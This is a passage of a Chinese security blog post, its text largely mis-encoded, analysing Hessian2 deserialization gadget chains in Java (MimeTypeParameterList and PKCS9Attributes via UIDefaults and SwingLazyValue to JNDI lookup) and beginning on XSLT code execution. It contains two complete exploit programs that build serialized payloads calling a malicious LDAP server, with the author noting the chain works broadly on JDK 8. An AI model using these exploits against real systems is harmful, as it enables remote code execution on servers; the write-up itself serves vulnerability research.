title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h2><p>é‚£å°±å¼€å§‹åˆ†æåˆ©ç”¨é“¾ï¼Œä»createValueæ–¹æ³•å¼€å§‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">createValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> UIDefaults table)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ReflectUtil.checkPackageAccess(className);<br>            Class&lt;?&gt; c = Class.forName(className, <span class="hljs-literal">true</span>, <span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">if</span> (methodName != <span class="hljs-literal">null</span>) &#123;<br>                Class[] types = getClassArray(args);<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.getMethod(methodName, types);<br>                makeAccessible(m);<br>                <span class="hljs-keyword">return</span> m.invoke(c, args);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                Class[] types = getClassArray(args);<br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getConstructor(types);<br>                makeAccessible(constructor);<br>                <span class="hljs-keyword">return</span> constructor.newInstance(args);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// Ideally we would throw an exception, unfortunately</span><br>            <span class="hljs-comment">// often times there are errors as an initial look and</span><br>            <span class="hljs-comment">// feel is loaded before one can be switched. Perhaps a</span><br>            <span class="hljs-comment">// flag should be added for debugging, so that if true</span><br>            <span class="hljs-comment">// the exception would be thrown.</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œè°ƒç”¨äº†Class.forNameï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ç±»çš„é™æ€ä»£ç å—ä»£ç </p><p>ç„¶åè¿™é‡Œä½¿ç”¨çš„ getMethod å’Œ getConstructor éƒ½åªèƒ½è·å–åˆ° public æ–¹æ³•ï¼Œè€Œ invoke çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª class è€Œä¸æ˜¯å¯¹è±¡å®ä¾‹ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ•ˆæœå°±æ˜¯å¯ä»¥è°ƒç”¨ä»»æ„ public çš„ static æ–¹æ³•ï¼Œæ‰€ä»¥æœ€åå¯ä»¥æ‰“jndiï¼Œåˆ©ç”¨InitialContext.doLookup()é™æ€æ–¹æ³•</p><p>ç„¶åä¹Ÿæ˜¯ç½‘ä¸Šæ‰¾å¼•ç”¨ï¼Œåˆ°UIDefaults.getFromHashTableè¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241127162219555.png" alt="image-20241127162219555"></p><p>è¿™ä¸ªvalueæ˜¯é€šè¿‡geté”®çš„å€¼è·å–çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">getFromHashtable</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object key)</span> &#123;<br>       <span class="hljs-comment">/* Quickly handle the common case, without grabbing</span><br><span class="hljs-comment">        * a lock.</span><br><span class="hljs-comment">        */</span><br>       <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.get(key);<br>       <span class="hljs-keyword">if</span> ((value != PENDING) &amp;&amp;<br>           !(value <span class="hljs-keyword">instanceof</span> ActiveValue) &amp;&amp;<br>           !(value <span class="hljs-keyword">instanceof</span> LazyValue)) &#123;<br>           <span class="hljs-keyword">return</span> value;<br>       &#125;<br></code></pre></td></tr></table></figure><p>UIDefaultsè¿™ä¸ªç±»æœ¬èº«å°±æ˜¯ç»§æ‰¿Hashtableçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ çš„è¿™ä¸ªvalueè¿˜éœ€è¦æ˜¯LazyValueçš„å®ä¾‹ï¼Œè€ŒSwingLazyValueå°±å®ç°äº†LazyValueæ¥å£</p><p><img src="https://cdn.clown2024.cn/image-20241127172000151.png" alt="image-20241127172000151"></p><p>ç„¶åUIDefaults.getæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getFromHashtable( key );<br>        <span class="hljs-keyword">return</span> (value != <span class="hljs-literal">null</span>) ? value : getFromResourceBundle(key, <span class="hljs-literal">null</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>ç„¶åMultiUIDefaults#toStringæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        buf.append(<span class="hljs-string">&quot;&#123;&quot;</span>);<br>        <span class="hljs-type">Enumeration</span> <span class="hljs-variable">keys</span> <span class="hljs-operator">=</span> keys();<br>        <span class="hljs-keyword">while</span> (keys.hasMoreElements()) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> keys.nextElement();<br>            buf.append(key + <span class="hljs-string">&quot;=&quot;</span> + get(key) + <span class="hljs-string">&quot;, &quot;</span>);<br>        &#125;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> buf.length();<br>        <span class="hljs-keyword">if</span> (length &gt; <span class="hljs-number">1</span>) &#123;<br>            buf.delete(length-<span class="hljs-number">2</span>, length);<br>        &#125;<br>        buf.append(<span class="hljs-string">&quot;&#125;&quot;</span>);<br>        <span class="hljs-keyword">return</span> buf.toString();<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªé“¾å­ç”¨ä¸äº†ï¼Œæ ¹æ®æ–‡ç« è¯´è¿™æ˜¯ä»xstreamçš„å†å²é“¾ä¸­å‚è€ƒæ¥çš„</p><p>xstreamçš„å†å²é“¾å¦‚ä¸‹ï¼Œ<a href="https://x-stream.github.io/CVE-2021-21346.html">https://x-stream.github.io/CVE-2021-21346.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Rdn$RdnEntry#compareTo-&gt;<br>    XString#equal-&gt;<br>        MultiUIDefaults#toString-&gt;<br>            UIDefaults#get-&gt;<br>                UIDefaults#getFromHashTable-&gt;<br>                    UIDefaults$LazyValue#createValue-&gt;<br>                        SwingLazyValue#createValue-&gt;<br>                            InitialContext#doLookup()<br></code></pre></td></tr></table></figure><blockquote><p>ä½†æ›´ç¦»è°±çš„æ˜¯æˆ‘æ˜¯è¿MultiUIDefaultsè¿™ä¸ªç±»éƒ½åˆ›å»ºä¸äº†çš„ï¼Œè€Œä¸”çœ‹äº†MultiUIDefaultsè¿™ä¸ªç±»ï¼Œæ„é€ æ–¹æ³•ä¹Ÿæ˜¯publicçš„å•Šï¼Œæ€ªäº†</p><p><img src="https://cdn.clown2024.cn/image-20241127164823491.png" alt="image-20241127164823491"></p><p>ä»–ä»¬çš„ç”¨ä¸äº†ååºåˆ—åŒ–æŠ¥é”™æ˜¯è¿™æ ·çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java.lang.IllegalAccessException: Class com.caucho.hessian.io.MapDeserializer can not access a member of class javax.swing.MultiUIDefaults with modifiers &quot;public&quot;<br></code></pre></td></tr></table></figure><p>å–”åŸæ¥æ˜¯ä½œç”¨åŸŸçš„é—®é¢˜ï¼Œå› ä¸ºè¯¥ç±»æ²¡æœ‰ä¿®é¥°ç¬¦ï¼Œæ‰€ä»¥åªèƒ½åœ¨javax.swingåŒ…å†…è®¿é—®ï¼Œé‚£ä¹ˆHessianå°±æ²¡æœ‰åŠæ³•ååºåˆ—åŒ–è¿™ä¸ªç±»äº†ï¼Œå› ä¸ºHessian2 æ‹¿åˆ°äº†æ„é€ å™¨ï¼Œä½†æ˜¯æ²¡æœ‰ setAccessableï¼ŒnewInstance å°±æ²¡æœ‰æƒé™</p></blockquote><p>æ‰€ä»¥MultiUIDefaultsè¿™ä¸ªç±»å¾—æ¢ä¸€ä¸‹ï¼Œæ‰¾ä¸ªå¹³æ›¿</p><p>è¦æ‰¾ç±»éœ€è¦æ˜¯ public çš„ï¼Œæ„é€ å™¨ä¹Ÿæ˜¯ public çš„ï¼Œæ„é€ å™¨çš„å‚æ•°ä¸ªæ•°ä¸è¦ç´§ï¼Œhessian2 ä¼šè‡ªåŠ¨æŒ¨ä¸ªæµ‹è¯•æ„é€ å™¨ç›´åˆ°æˆåŠŸ</p><p>ç„¶åæ˜¯æ‰¾åˆ°è¿™ä¸ªç±»<strong>MimeTypeParameterList</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>    buffer.ensureCapacity(<span class="hljs-built_in">this</span>.parameters.size() * <span class="hljs-number">16</span>);<br>    <span class="hljs-type">Enumeration</span> <span class="hljs-variable">keys</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.parameters.keys();<br><br>    <span class="hljs-keyword">while</span>(keys.hasMoreElements()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (String)keys.nextElement();<br>        buffer.append(<span class="hljs-string">&quot;; &quot;</span>);<br>        buffer.append(key);<br>        buffer.append(<span class="hljs-string">&#x27;=&#x27;</span>);<br>        buffer.append(quote((String)<span class="hljs-built_in">this</span>.parameters.get(key)));<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> buffer.toString();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªparameterså±æ€§å°±æ˜¯ä¸€ä¸ªHashtable</p><p><img src="https://cdn.clown2024.cn/image-20241127170703885.png" alt="image-20241127170703885"></p><p>ç°åœ¨é“¾å­å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">MimeTypeParameterList.toString<br>            UIDefaults.get<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br>                    SwingLazyValue.createValue<br>                        javax.naming.InitialContext.doLookup()<br></code></pre></td></tr></table></figure><h2 id="expç¼–å†™"><a href="#expç¼–å†™" class="headerlink" title="expç¼–å†™"></a>expç¼–å†™</h2><p>é‚£å°±å¯ä»¥ç¼–å†™å¼‚å¸¸è§¦å‘toStringçš„expäº†</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.activation.MimeTypeParameterList;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MimeTypeParameterListExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//æ„é€ æ¶æ„ç±»</span><br>        <span class="hljs-type">MimeTypeParameterList</span> <span class="hljs-variable">mimeTypeParameterList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MimeTypeParameterList</span>();<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>,<span class="hljs-string">&quot;doLookup&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;ldap://127.0.0.1:8085/TaeXQxXj&quot;</span>&#125;);<br>        uiDefaults.put(<span class="hljs-string">&quot;clown&quot;</span>,swingLazyValue);<br>        setField(mimeTypeParameterList,<span class="hljs-string">&quot;parameters&quot;</span>,uiDefaults);<br><br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(mimeTypeParameterList);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        Hessian2_Deserial(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨yakièµ·äº†ä¸€ä¸ªæ¶æ„ldapæœåŠ¡</p><p><img src="https://cdn.clown2024.cn/image-20241127173030719.png" alt="image-20241127173030719"></p><p><img src="https://cdn.clown2024.cn/image-20241127173045646.png" alt="image-20241127173045646"></p><h1 id="pkcs9attributesåˆ©ç”¨é“¾"><a href="#PKCS9Attributesåˆ©ç”¨é“¾" class="headerlink" title="PKCS9Attributesåˆ©ç”¨é“¾"></a>PKCS9Attributesåˆ©ç”¨é“¾</h1><p>è¿™æ˜¯å¦ä¸€æ¡åˆ©ç”¨é“¾ï¼Œè¯´æ˜¯åœ¨nacosçš„raftååºåˆ—åŒ–ä¸­å‡ºç°è¿‡ï¼Œåˆ°æ—¶å€™çœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PKCS9Attributes#toString-&gt;<br>   PKCS9Attributes#getAttribute-&gt;<br>     UIDefaults#get-&gt;<br>        UIDefaults#getFromHashTable-&gt;<br>           UIDefaults$LazyValue#createValue-&gt;<br>                SwingLazyValue#createValue-&gt;<br>                   InitialContext#doLookup()<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåé¢çš„éƒ¨åˆ†ä¹Ÿæ²¡æœ‰å˜åŒ–ï¼Œåªæ˜¯å‰é¢è§¦å‘getæ–¹æ³•çš„åœ°æ–¹å˜äº†ï¼Œç®€å•çœ‹çœ‹</p><p>PKCS9Attributes#toString</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-number">200</span>);<br>        buf.append(<span class="hljs-string">&quot;PKCS9 Attributes: [\n\t&quot;</span>);<br><br>        ObjectIdentifier oid;<br>        PKCS9Attribute value;<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">first</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; PKCS9Attribute.PKCS9_OIDS.length; i++) &#123;<br>            value = getAttribute(PKCS9Attribute.PKCS9_OIDS[i]);<br><br>            <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-comment">// we have a value; print it</span><br>            <span class="hljs-keyword">if</span> (first)<br>                first = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">else</span><br>                buf.append(<span class="hljs-string">&quot;;\n\t&quot;</span>);<br><br>            buf.append(value.toString());<br>        &#125;<br><br>        buf.append(<span class="hljs-string">&quot;\n\t] (end PKCS9 Attributes)&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> buf.toString();<br>    &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéå†PKCS9_OIDSï¼ŒPKCS9_OIDSæ˜¯ObjectIdentifierç±»æ•°ç»„</p><p><img src="https://cdn.clown2024.cn/image-20241127192307756.png" alt="image-20241127192307756"></p><p>ç„¶åè°ƒç”¨getAttributeæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> PKCS9Attribute <span class="hljs-title function_">getAttribute</span><span class="hljs-params">(ObjectIdentifier oid)</span> &#123;<br>    <span class="hljs-keyword">return</span> attributes.get(oid);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åè°ƒç”¨getæ–¹æ³•ï¼Œè¿™é‡Œçš„attributesæ˜¯ä¸€ä¸ªHashtable</p><p><img src="https://cdn.clown2024.cn/image-20241127192511001.png" alt="image-20241127192511001"></p><p>é‚£å°±ç›´æ¥å†™ä¸€ä¸ªexpå‡ºæ¥å¯ä»¥</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.activation.MimeTypeParameterList;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PKCS9AttributesExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//æ„é€ æ¶æ„ç±»</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        uiDefaults.put(PKCS9Attribute.CONTENT_TYPE_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>,<span class="hljs-string">&quot;doLookup&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;ldap://127.0.0.1:8085/TaeXQxXj&quot;</span>&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br><br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        Hessian2_Deserial(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241127193819235.png" alt="image-20241127193819235"></p><p>ç„¶åè¿™é‡Œæœ‰ä¸€ä¸ªå°çŸ¥è¯†ç‚¹ï¼Œæˆ‘è¿™é‡Œä¸€å¼€å§‹å¾ˆå¥½å¥‡ï¼Œä¸ºä»€ä¹ˆæˆ‘å¯ä»¥å¼ºåˆ¶ä¿®æ”¹PKCS9Attributesçš„attributeså±æ€§ï¼Œæ˜æ˜æ³›å‹éƒ½ä¸ä¸€æ ·ï¼Œé—®äº†ä¸€ä¸‹é€šçµä¹‰ç ï¼Œè§£é‡Šå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Java çš„æ³›å‹åœ¨è¿è¡Œæ—¶ä¼šè¢«æ“¦é™¤ï¼Œå› æ­¤åœ¨è¿è¡Œæ—¶ä¸ä¼šæ£€æŸ¥æ³›å‹ç±»å‹ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä½ å¯ä»¥é€šè¿‡åå°„å°† UIDefaults è®¾ç½®ä¸º attributes å­—æ®µè€Œæ²¡æœ‰ç«‹å³æŠ›å‡ºé”™è¯¯çš„åŸå› <br></code></pre></td></tr></table></figure><p>åŸæ¥å¦‚æ­¤</p><p>è€Œä¸”è¿™ä¸ªgadgetåœ¨jdk8å¯ä»¥é€šæ€ï¼Œå› ä¸ºæ˜¯åŸç”Ÿçš„é“¾å­çš„ï¼Œå¯ç”¨æ€§éå¸¸é«˜</p><h1 id="xsltä»£ç æ‰§è¡Œ"><a href="#XSLTä»£ç æ‰§è¡Œ" class="headerlink" title="XSLTä»£ç æ‰§è¡Œ"></a>XSLTä»£ç æ‰§è¡Œ</h1><p>è¿™é‡Œæ‹‰åœ¨ä¸€èµ·å­¦äº†ï¼Œå› ä¸ºç”¨hessianæ‰“å†…å­˜é©¬çš„æ—¶å€™ç”¨åˆ°äº†</p><p>çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/15670?u_atoken=4522326c1b0eeaa26f519f65d9e58254&u_asig=0a472f5217326934441316160e013b">https://xz.aliyun.com/t/15670?u_atoken=4522326c1b0eeaa26f519f65d9e58254&amp;u_asig=0a472f5217326934441316160e013b</a></p><h2 id="xsltä»‹ç»"><a href="#XSLTä»‹ç»" class="headerlink" title="XSLTä»‹ç»"></a>XSLTä»‹ç»</h2><p>XSLTï¼ˆExtensible Stylesheet Language Transformationsï¼Œå¯æ‰©å±•<a href="https://so.csdn.net/so/search?q=%E6%A0%B7%E5%BC%8F%E8%A1%A8%E8%AF%AD%E8%A8%80&spm=1001.2101.3001.7020">æ ·å¼è¡¨è¯­è¨€</a>è½¬æ¢ï¼‰æ˜¯ä¸€ç§ç”¨äºå°†XMLæ–‡æ¡£è½¬æ¢æˆHTMLã€æ–‡æœ¬ã€æˆ–å…¶ä»–XMLæ–‡æ¡£çš„è¯­è¨€ã€‚å®ƒåŸºäºXPathå’ŒXSLï¼Œæ˜¯W3Cï¼ˆä¸‡ç»´ç½‘è”ç›Ÿï¼‰å®šä¹‰çš„ä¸€ä¸ªæ ‡å‡†ã€‚</p><p>åŸºæœ¬è¯­æ³•ï¼š</p><p>xsl:stylesheetï¼šæ 